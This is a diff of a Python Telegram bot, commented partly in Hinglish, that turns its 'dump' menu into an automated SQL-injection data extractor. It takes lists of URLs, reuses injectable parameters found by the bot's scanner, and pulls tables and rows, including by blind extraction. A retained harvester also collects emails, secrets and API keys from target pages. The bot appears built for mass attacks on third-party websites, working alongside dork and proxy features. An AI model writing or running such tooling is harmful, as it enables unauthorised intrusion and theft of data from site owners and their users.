@@ -7915,15 +8577,19 @@ async def tool_dump(update, context):
 
 async def cb_dump_go(update, context):
     q = update.callback_query
+    caps = _sqli_caps()
     rows = [[InlineKeyboardButton("⬅️ BACK", callback_data="m:dump")]]
-    txt = (H("SEND URLS TO DUMP", "text ya file") + "\n\n"
+    txt = (H("SEND URLS TO DUMP", "step 1 — URLs") + "\n\n"
            + B("Paste") + "\n" + P("one URL per line") + "\n"
            + "<code>https://target.com/item.php?id=12</code>\n\n"
            + B("File") + "\n" + P(".txt / .csv / .json / .xlsx — all URLs at once")
            + "\n\n"
-           + KV("Timeout", "<code>%ss</code>" % int(sget("dump_timeout", 10) or 10), "⏱")
-           + "\n" + KV("Parallel", "<code>%d</code> pages" % int(sget("dump_conc", 12) or 12), "⚡")
-           + "\n\n" + P("You get one report per URL, plus everything in one zip."))
+           + KV("Tables / URL", "<code>%s</code>" % fmt(caps["tables"]), "🗃") + "\n"
+           + KV("Rows / table", "<code>%s</code>" % fmt(caps["rows"]), "📄") + "\n"
+           + KV("Timeout", "<code>%ss</code>" % int(sget("dump_timeout", 8) or 8), "⏱")
+           + "\n" + KV("Parallel", "<code>%d</code> URLs" % int(sget("dump_conc", 3) or 3), "⚡")
+           + "\n\n" + P("Only injectable URLs give data — the rest are reported with the "
+                        "exact reason."))
     try:
         await q.edit_message_text(txt, reply_markup=RK(rows), parse_mode=ParseMode.HTML)
     except Exception:
@@ -7931,134 +8597,20 @@ async def cb_dump_go(update, context):
     await_set(context, "dump_urls")
 
 
-async def cb_dump_old(update, context):
+async def cb_dump_harv(update, context):
     q = update.callback_query
-    files = dumps_list(12)
-    if not files:
-        try:
-            await q.answer("No files yet", show_alert=True)
-        except Exception:
-            pass
-        return
-    rows = [[InlineKeyboardButton("📄 %s (%.0f KB)" % (os.path.basename(f)[:26],
-                                                      os.path.getsize(f) / 1024),
-                                  callback_data="df:%d" % i)]
-            for i, f in enumerate(files)]
-    rows.append([InlineKeyboardButton("⬅️ BACK", callback_data="m:dump")])
     try:
-        await q.edit_message_text(H("OLD DUMP FILES", "%d saved" % len(files)),
-                                  reply_markup=RK(rows), parse_mode=ParseMode.HTML)
+        await q.edit_message_text(
+            (H("PAGE HARVEST", "step 1 — URLs") + "\n\n"
+             + P("Send URLs one per line, or a .txt / .csv file. Every page is fetched and "
+                 "the forms, links, JS files, emails, comments, table names and API keys "
+                 "inside it are saved per URL.") + "\n\n"
+             + "<code>https://target.com/product.php?id=5</code>"),
+            parse_mode=ParseMode.HTML,
+            reply_markup=RK([[InlineKeyboardButton("⬅️ BACK", callback_data="m:dump")]]))
     except Exception:
         pass
-
-
-async def cb_dump_use(update, context, which: str):
-    """df:last / df:vuln — purane URLs se seedha dump."""
-    if which == "vuln":
-        urls = _uniq([v.get("base") or v["url"]
-                      for v in (context.user_data.get("last_vulns") or [])])
-    else:
-        urls = context.user_data.get("last_urls") or []
-    if not urls:
-        try:
-            await update.callback_query.answer("Nothing saved yet — run a scan first",
-                                               show_alert=True)
-        except Exception:
-            pass
-        return
-    await _run_dump(update, context, urls)
-
-
-def _dump_progress_card(st: dict, spin: int) -> str:
-    pct = (st["done"] / max(1, st["urls"])) * 100
-    took = max(0.001, time.time() - st["start"])
-    rate = st["done"] / took
-    eta = ((st["urls"] - st["done"]) / rate) if rate > 0.05 else 0
-    return (H("DUMPING", "page harvest in progress") + "\n\n"
-            + bar3(pct, 12, spin) + "\n\n"
-            + "❖ Pages     : <code>%s/%s</code>\n" % (fmt(st["done"]), fmt(st["urls"]))
-            + "❖ Extracted : <code>%s</code>\n" % fmt(len(st["records"]))
-            + "❖ Errors    : <code>%s</code>\n" % fmt(st["errors"])
-            + "❖ Speed     : <code>%.1f page/s</code>\n" % rate
-            + "❖ ETA       : <code>%s</code>" % (("%.0fs" % eta) if eta else "—"))
-
-
-async def _run_dump(update, context, urls):
-    uid = str(update.effective_user.id)
-    stop_clear(uid)
-    tok = stop_mark(uid)
-    urls = _uniq([u for u in urls if str(u).startswith("http")])
-    msg = await reply_msg(update).reply_text(
-        _dump_progress_card({"urls": len(urls), "done": 0, "records": [], "errors": 0,
-                             "start": time.time()}, 0),
-        parse_mode=ParseMode.HTML, reply_markup=kb_stop(uid, tok))
-    spin = {"n": 0}
-
-    async def prog(st):
-        spin["n"] += 1
-        try:
-            await msg.edit_text(_dump_progress_card(st, spin["n"]),
-                                parse_mode=ParseMode.HTML, reply_markup=kb_stop(uid, tok))
-        except Exception:
-            pass
-
-    st = await dump_harvest(urls, progress=prog, uid=uid,
-                           timeout=float(sget("dump_timeout", 10) or 10),
-                           conc=int(sget("dump_conc", 12) or 12))
-    recs = st["records"]
-    tot_forms = sum(len(r["forms"]) for r in recs)
-    tot_ep = sum(len(r["endpoints"]) for r in recs)
-    tot_pr = len(_uniq([p for r in recs for p in r["params"]]))
-    tot_em = len(_uniq([e for r in recs for e in r["emails"]]))
-    tot_se = sum(len(r["secrets"]) for r in recs)
-    card = (H("DUMP COMPLETE", "%.1fs" % st.get("took", 0)) + "\n\n"
-            + bar3(100, 12, None) + "\n\n"
-            + "❖ Pages    : <code>%s</code> (errors <code>%s</code>)\n"
-            % (fmt(len(recs)), fmt(st["errors"]))
-            + "❖ Forms    : <code>%s</code>\n" % fmt(tot_forms)
-            + "❖ Endpoints: <code>%s</code>\n" % fmt(tot_ep)
-            + "❖ Params   : <code>%s</code>\n" % fmt(tot_pr)
-            + "❖ Emails   : <code>%s</code>\n" % fmt(tot_em)
-            + "❖ Secrets  : <code>%s</code>\n" % fmt(tot_se)
-            + ("⛔ Stopped early\n" if st.get("stopped") else "")
-            + "\n" + B("Top pages"))
-    for r in recs[:5]:
-        card += "\n<code>%s</code>\n<i>%s</i>" % (
-            esc(r["url"][:130]), esc(r["title"] or "no title")[:70])
-    if len(recs) > 5:
-        card += "\n<i>+ %d more inside the zip…</i>" % (len(recs) - 5)
-    try:
-        await msg.delete()
-    except Exception:
-        pass
-    for ch in chunk_lines(card)[:3]:
-        await reply_msg(update).reply_text(ch, parse_mode=ParseMode.HTML,
-                                           reply_markup=kb_back("m:dump"))
-    for f in st["files"][:4]:
-        await send_file(update, f, "📄 " + os.path.basename(f))
-    if len(st["files"]) > 4:
-        await reply_msg(update).reply_text(
-            "📁 Remaining %d report(s) are inside the zip below."
-            % (len(st["files"]) - 4), parse_mode=ParseMode.HTML)
-    if st.get("zip"):
-        await send_file(update, st["zip"], "📦 All reports + summary.csv + summary.json")
-    if st.get("csv"):
-        await send_file(update, st["csv"], "📊 One-line-per-page summary")
-    context.user_data["last_dump"] = {"pages": len(recs), "secrets": tot_se,
-                                     "zip": st.get("zip", "")}
-    await_clear(context)
-
-
-async def input_dump_urls(update, context, text: str):
-    urls = _urls_from_text(text)
-    if not urls:
-        await reply_msg(update).reply_text(
-            "❌ <b>No URLs found.</b>\nSend full URLs (one per line) or a .txt file:\n"
-            "<code>https://target.com/item.php?id=12</code>",
-            parse_mode=ParseMode.HTML, reply_markup=kb_back("m:dump"))
-        await_set(context, "dump_urls")
-        return
-    await _run_dump(update, context, urls)
+    await_set(context, "harvest_urls")
 
 
 async def cb_dump_full(update, context):
@@ -8121,7 +8673,7 @@ async def cb_dump_file(update, context):
             except Exception:
                 pass
             return
-        await send_file(update, name, "📦 saare dumps")
+        await send_file(update, name, "📦 all dump files")
         return
     try:
         idx = int(arg)
@@ -8131,6 +8683,231 @@ async def cb_dump_file(update, context):
             await q.answer("File not found", show_alert=True)
         except Exception:
             pass
+
+
+async def cb_dump_old(update, context):
+    q = update.callback_query
+    files = dumps_list(12)
+    if not files:
+        try:
+            await q.answer("No files yet", show_alert=True)
+        except Exception:
+            pass
+        return
+    rows = [[InlineKeyboardButton("📄 %s (%.0f KB)" % (os.path.basename(f)[:26],
+                                                      os.path.getsize(f) / 1024),
+                                  callback_data="df:%d" % i)]
+            for i, f in enumerate(files)]
+    rows.append([InlineKeyboardButton("⬅️ BACK", callback_data="m:dump")])
+    try:
+        await q.edit_message_text(H("OLD DUMP FILES", "%d saved" % len(files)),
+                                  reply_markup=RK(rows), parse_mode=ParseMode.HTML)
+    except Exception:
+        pass
+
+
+async def cb_dump_use(update, context, which: str):
+    """df:last / df:vuln — saved URLs se seedha full dump."""
+    targets = {}
+    if which == "vuln":
+        vulns = context.user_data.get("last_vulns") or []
+        urls = _uniq([v.get("base") or v.get("url") for v in vulns])
+        for v in vulns:
+            base = v.get("base") or v.get("url")
+            if base and v.get("param"):
+                targets[base] = v["param"]
+    else:
+        urls = context.user_data.get("last_urls") or []
+    if not urls:
+        try:
+            await update.callback_query.answer("Nothing saved yet — run PARSER or SCANNER first",
+                                              show_alert=True)
+        except Exception:
+            pass
+        return
+    await _run_sqldump(update, context, urls, targets)
+
+
+def _sqli_caps() -> dict:
+    return {"tables": int(sget("dump_tables", 8) or 8),
+            "rows": int(sget("dump_rows", 8) or 8),
+            "blind": int(sget("dump_blind", 1) or 0),
+            "blind_len": int(sget("dump_blind_len", 24) or 24),
+            "blind_rows": int(sget("dump_blind_rows", 0) or 0),
+            "blind_tables": int(sget("dump_tables", 8) or 8),
+            "requests": int(sget("dump_requests", 500) or 500)}
+
+
+def _dump_progress_card(st: dict, spin: int) -> str:
+    pct = (st["done"] / max(1, st["urls"])) * 100
+    took = max(0.001, time.time() - st["start"])
+    return (H("SQL DUMP", "live extraction") + "\n\n"
+            + bar3(pct, 12, spin) + "\n\n"
+            + "❖ URLs      : <code>%s/%s</code>\n" % (fmt(st["done"]), fmt(st["urls"]))
+            + "❖ Injectable: <code>%s</code>\n" % fmt(st.get("injectable", 0))
+            + "❖ Tables    : <code>%s</code>\n" % fmt(st.get("tables", 0))
+            + "❖ Rows      : <code>%s</code>\n" % fmt(st.get("rows", 0))
+            + "❖ Stage     : <b>%s</b> <i>%s</i>\n" % (esc(st.get("stage") or "-"),
+                                                    esc(st.get("stage_info") or ""))
+            + "❖ Elapsed   : <code>%.1fs</code>" % took)
+
+
+def _dump_status_line(res: dict) -> str:
+    host = urlparse(res.get("url") or "").netloc or res.get("url") or "-"
+    if res.get("ok"):
+        return "✅ <b>%s</b>\n   <i>%s · %s · param <code>%s</code> · %d tables · %d rows</i>" % (
+            esc(host[:44]), esc(res.get("dbms") or "-"), esc(res.get("tech") or "-"),
+            esc(res.get("param") or "-"), len(res.get("tables") or {}), res.get("rows", 0))
+    return "⛔ <b>%s</b> — <i>%s</i>" % (
+        esc(host[:44]), esc((res.get("why") or res.get("status") or "not injectable")[:80]))
+
+
+async def _run_sqldump(update, context, urls, targets=None):
+    """ASLI dump — URLs ke andar ka data nikaalo (db → tables → columns → rows)."""
+    uid = str(update.effective_user.id)
+    stop_clear(uid)
+    tok = stop_mark(uid)
+    urls = _uniq([u for u in urls if str(u).startswith("http")])
+    caps = _sqli_caps()
+    msg = await reply_msg(update).reply_text(
+        _dump_progress_card({"urls": len(urls), "done": 0, "results": [], "rows": 0,
+                             "tables": 0, "injectable": 0, "start": time.time(),
+                             "stage": "starting", "stage_info": ""}, 0),
+        parse_mode=ParseMode.HTML, reply_markup=kb_stop(uid, tok))
+    spin = {"n": 0}
+
+    async def prog(st):
+        spin["n"] += 1
+        try:
+            await msg.edit_text(_dump_progress_card(st, spin["n"]),
+                                parse_mode=ParseMode.HTML, reply_markup=kb_stop(uid, tok))
+        except Exception:
+            pass
+
+    st = await sqli_dump(urls, targets=targets, caps=caps,
+                         timeout=float(sget("dump_timeout", 8) or 8),
+                         conc=int(sget("dump_conc", 3) or 3), progress=prog, uid=uid)
+    saved = sqli_save(st)
+    results = st["results"]
+    okn = st["injectable"]
+    head = ("🎯 <b>%d of %d URL(s) injectable</b>" % (okn, len(results))) if okn else \
+        "🛡 <b>No injectable URL found</b>"
+    card = (H("SQL DUMP COMPLETE", "%.1fs" % st.get("took", 0)) + "\n\n"
+            + head + "\n"
+            + "❖ Tables  : <code>%s</code>\n" % fmt(st["tables"])
+            + "❖ Rows    : <code>%s</code>\n" % fmt(st["rows"])
+            + "❖ Files   : <code>%s</code>\n" % fmt(len(saved["files"]))
+            + ("⛔ Stopped early\n" if st.get("stopped") else "")
+            + "\n" + bar3(100, 12, None) + "\n\n" + B("Results"))
+    for res in results[:6]:
+        card += "\n" + _dump_status_line(res) + "\n"
+    if len(results) > 6:
+        card += "<i>+ %d more in the files…</i>\n" % (len(results) - 6)
+    try:
+        await msg.delete()
+    except Exception:
+        pass
+    for ch in chunk_lines(card)[:3]:
+        await reply_msg(update).reply_text(ch, parse_mode=ParseMode.HTML,
+                                          reply_markup=kb_back("m:dump"))
+    for f in saved["files"][:3]:
+        await send_file(update, f, "📄 " + os.path.basename(f))
+    if len(saved["files"]) > 3:
+        await reply_msg(update).reply_text(
+            "📁 Remaining %d report(s) are inside the zip."
+            % (len(saved["files"]) - 3), parse_mode=ParseMode.HTML)
+    if saved["csv"]:
+        await send_file(update, saved["csv"], "📊 all rows (csv)")
+    if saved["zip"]:
+        await send_file(update, saved["zip"], "📦 all reports + rows csv")
+    context.user_data["last_sqldump"] = {"urls": len(results), "injectable": okn,
+                                         "rows": st["rows"], "tables": st["tables"]}
+    await_clear(context)
+
+
+async def _run_dump(update, context, urls):
+    """Page harvest (forms/links/emails/secrets) — purana dumper."""
+    uid = str(update.effective_user.id)
+    stop_clear(uid)
+    tok = stop_mark(uid)
+    urls = _uniq([u for u in urls if str(u).startswith("http")])
+    msg = await reply_msg(update).reply_text(
+        _dump_progress_card({"urls": len(urls), "done": 0, "records": [], "errors": 0,
+                             "start": time.time()}, 0),
+        parse_mode=ParseMode.HTML, reply_markup=kb_stop(uid, tok))
+    spin = {"n": 0}
+
+    async def prog(st):
+        spin["n"] += 1
+        try:
+            await msg.edit_text(
+                (H("PAGE HARVEST", "forms • links • secrets") + "\n\n"
+                 + bar3((st["done"] / max(1, st["urls"])) * 100, 12, spin["n"]) + "\n\n"
+                 + "❖ Pages     : <code>%s/%s</code>\n" % (fmt(st["done"]), fmt(st["urls"]))
+                 + "❖ Extracted : <code>%s</code>\n" % fmt(len(st["records"]))),
+                parse_mode=ParseMode.HTML, reply_markup=kb_stop(uid, tok))
+        except Exception:
+            pass
+
+    st = await dump_harvest(urls, progress=prog, uid=uid,
+                            timeout=float(sget("dump_timeout", 10) or 10),
+                            conc=int(sget("dump_conc", 12) or 12))
+    recs = st["records"]
+    tot_ep = sum(len(r["endpoints"]) for r in recs)
+    tot_se = sum(len(r["secrets"]) for r in recs)
+    tot_em = len(_uniq([e for r in recs for e in r["emails"]]))
+    card = (H("HARVEST COMPLETE", "%.1fs" % st.get("took", 0)) + "\n\n"
+            + bar3(100, 12, None) + "\n\n"
+            + "❖ Pages    : <code>%s</code> (errors <code>%s</code>)\n"
+            % (fmt(len(recs)), fmt(st["errors"]))
+            + "❖ Endpoints: <code>%s</code>\n" % fmt(tot_ep)
+            + "❖ Emails   : <code>%s</code>\n" % fmt(tot_em)
+            + "❖ Secrets  : <code>%s</code>\n" % fmt(tot_se) + "\n" + B("Top pages"))
+    for r in recs[:5]:
+        card += "\n<code>%s</code>\n<i>%s</i>" % (
+            esc(r["url"][:130]), esc(r["title"] or "no title")[:70])
+    try:
+        await msg.delete()
+    except Exception:
+        pass
+    for ch in chunk_lines(card)[:3]:
+        await reply_msg(update).reply_text(ch, parse_mode=ParseMode.HTML,
+                                          reply_markup=kb_back("m:dump"))
+    for f in st["files"][:3]:
+        await send_file(update, f, "📄 " + os.path.basename(f))
+    if st.get("zip"):
+        await send_file(update, st["zip"], "📦 all page reports + summary")
+    await_clear(context)
+
+
+async def input_dump_urls(update, context, text: str):
+    urls = _urls_from_text(text)
+    if not urls:
+        await reply_msg(update).reply_text(
+            "❌ <b>No URLs found.</b>\nSend full URLs (one per line) or a .txt file:\n"
+            "<code>https://target.com/item.php?id=12</code>",
+            parse_mode=ParseMode.HTML, reply_markup=kb_back("m:dump"))
+        await_set(context, "dump_urls")
+        return
+    targets = {}
+    for v in (context.user_data.get("last_vulns") or []):
+        base = v.get("base") or v.get("url")
+        if base and v.get("param"):
+            targets[base] = v["param"]
+    await _run_sqldump(update, context, urls, targets)
+
+
+async def input_harvest_urls(update, context, text: str):
+    urls = _urls_from_text(text)
+    if not urls:
+        await reply_msg(update).reply_text(
+            "❌ <b>No URLs found.</b>\nSend full URLs (one per line) or a .txt file.",
+            parse_mode=ParseMode.HTML, reply_markup=kb_back("m:dump"))
+        await_set(context, "harvest_urls")
+        return
+    await _run_dump(update, context, urls)
+
+
 
 
 # ═══════════════════════════════════════════════════════════════════════════════
@@ -8408,7 +9185,8 @@ def kb_file(kind: str) -> InlineKeyboardMarkup:
 # file ko seedha in flows me daal sakte hain (text chahiye, number nahi)
 FILE_FLOW_TEXT = {"gen_kw", "dpgen_kw", "kw_input", "qa_keywords", "nc_kw", "px_paste",
                   "rot_paste",
-                  "qa_dorks", "qa_urls", "rev_urls", "inj_urls", "dump_urls", "parse_dorks",
+                  "qa_dorks", "qa_urls", "rev_urls", "inj_urls", "dump_urls", "harvest_urls",
+                  "parse_dorks",
                   "rand_items", "pro_combo", "pro_domains", "pro_params",
                   "pro_filetypes", "pro_sfilters", "pro_pfilters"}
 # count wale steps — file se count nahi nikalte
@@ -9438,6 +10216,7 @@ AWAIT_HANDLERS = {
     "rev_urls": input_rev_urls,
     "inj_urls": input_inj_urls,
     "dump_urls": input_dump_urls,
+    "harvest_urls": input_harvest_urls,
     "parse_dorks": input_parse_dorks,
     "parse_max": input_parse_max,
     "rand_items": input_rand,
@@ -10522,6 +11301,11 @@ BATCH_KEYS = {
     "injtime": ("inj_timeout", 3, 30, "Injector request timeout (s)", 8, "⏱"),
     "dumpconc": ("dump_conc", 2, 60, "Dumper parallel pages", 12, "📄"),
     "dumptime": ("dump_timeout", 5, 45, "Dumper page timeout (s)", 10, "⌛"),
+    "dumptables": ("dump_tables", 1, 100, "Dump: tables per URL", 8, "🗃"),
+    "dumprows": ("dump_rows", 1, 500, "Dump: rows per table", 8, "📄"),
+    "dumpblind": ("dump_blind", 0, 1, "Dump: blind extraction (0/1)", 1, "🙈"),
+    "dumpblindrows": ("dump_blind_rows", 0, 50, "Dump: blind rows per table", 0, "🐢"),
+    "dumpreq": ("dump_requests", 100, 5000, "Dump: request cap per URL", 500, "🔋"),
 }
 
 
@@ -10550,6 +11334,8 @@ def batch_card() -> str:
             "<code>/batch injtargets 36</code> — injector tests per URL\n"
             "<code>/batch injconc 30</code> · <code>/batch injtime 8</code>\n"
             "<code>/batch dumpconc 12</code> · <code>/batch dumptime 10</code>\n"
+            "<code>/batch dumptables 15</code> · <code>/batch dumprows 50</code>\n"
+            "<code>/batch dumpblind 1</code> · <code>/batch dumpreq 800</code>\n"
             "<code>/batch trial 1</code> — trial lock ON (files locked)\n\n"
             "<i>Proxy batching checks 60k proxies in slices: 4k → next 4k → … "
             "until every one is done. 2000–4000 is best on a phone.</i>")
